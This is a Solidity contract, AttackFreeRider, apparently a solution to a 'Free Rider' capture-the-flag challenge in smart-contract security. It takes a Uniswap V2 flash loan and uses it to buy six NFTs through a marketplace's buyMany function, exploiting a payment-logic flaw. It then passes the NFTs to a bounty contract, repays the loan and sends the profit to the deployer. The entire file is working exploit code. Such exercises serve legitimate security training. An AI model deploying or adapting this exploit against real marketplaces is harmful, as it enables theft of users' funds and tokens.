// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _tokenId,
        bytes calldata data
    ) external payable;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    address immutable uniswapfactory;
    address immutable bounty;
    address payable immutable owner;
    IERC721 immutable nft;
    IFreeRiderNFTMarketplace immutable marketplace;
    IWETH immutable weth;

    constructor(
        address factory,
        address router,
        address _marketplace,
        address _bounty,
        address _nft
    ) public payable {
        owner = msg.sender;
        uniswapfactory = factory;
        weth = IWETH(IUniswapV2Router01(router).WETH());
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        bounty = _bounty;
        nft = IERC721(_nft);
    }

    receive() external payable {}

    function payAmount(uint amount) public pure returns (uint) {
        //Determin payback amount
        uint fees = (amount / 100000) * 301; //Calculate 0.3009027% fees
        return amount + fees;
    }

    function uniswapV2Call(
        address, // sender,
        uint amount0,
        uint amount1,
        bytes calldata // data
    ) external override {
        uint amountToken;
        uint amountWETH;

        // Basic validation making sure we are being called by the correct Uniswap V2 pair.
        {
            // Scope for token{0,1}, avoids stack too deep errors

            // Ensure msg.sender is Uniswap V2 pair
            address token0 = IUniswapV2Pair(msg.sender).token0();
            address token1 = IUniswapV2Pair(msg.sender).token1();
            require(
                msg.sender ==
                    UniswapV2Library.pairFor(uniswapfactory, token0, token1),
                "Sender not allowed"
            );

            // One of the tokens must be WETH
            require(
                token0 == address(weth) || token1 == address(weth),
                "WETH token not identified"
            );

            // Identify the WETH token and the "other" token and
            if (token0 == address(weth)) {
                amountToken = amount1;
                amountWETH = amount0;
            } else {
                amountToken = amount0;
                amountWETH = amount1;
            }

            // We are only intersted in receiving WETH
            require(amountToken == 0, "Unexpected: Don't want these tokens.");
            require(amountWETH > 0, "Unexpected: No WETH tokens received.");
        }

        // Convert WETH to ETH
        weth.withdraw(amountWETH);

        // Buy all NFTs
        uint256[] memory tokenids = new uint256[](6);
        tokenids[0] = uint256(0);
        tokenids[1] = uint256(1);
        tokenids[2] = uint256(2);
        tokenids[3] = uint256(3);
        tokenids[4] = uint256(4);
        tokenids[5] = uint256(5);
        marketplace.buyMany{value: amountWETH}(tokenids);

        // The bounty contract is expecting the data parameter
        // to contain the bounty recipient address
        bytes memory extra_data = abi.encode(address(this));
        nft.safeTransferFrom(address(this), bounty, 0, extra_data);
        nft.safeTransferFrom(address(this), bounty, 1, extra_data);
        nft.safeTransferFrom(address(this), bounty, 2, extra_data);
        nft.safeTransferFrom(address(this), bounty, 3, extra_data);
        nft.safeTransferFrom(address(this), bounty, 4, extra_data);
        nft.safeTransferFrom(address(this), bounty, 5, extra_data);

        //Determine payback amount
        uint amountRequired = payAmount(amountWETH);

        //Convert ETH to WETH
        weth.deposit{value: amountRequired}();

        //Pay back the loan amount + fee
        require(
            weth.transfer(msg.sender, amountRequired),
            "Returning WETH failed"
        ); // return tokens to V2 pair

        //Transfer eth balance to caller
        owner.transfer(address(this).balance - 0.1 ether);
    }

    // Accept any ERC721 nft sent to us!
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
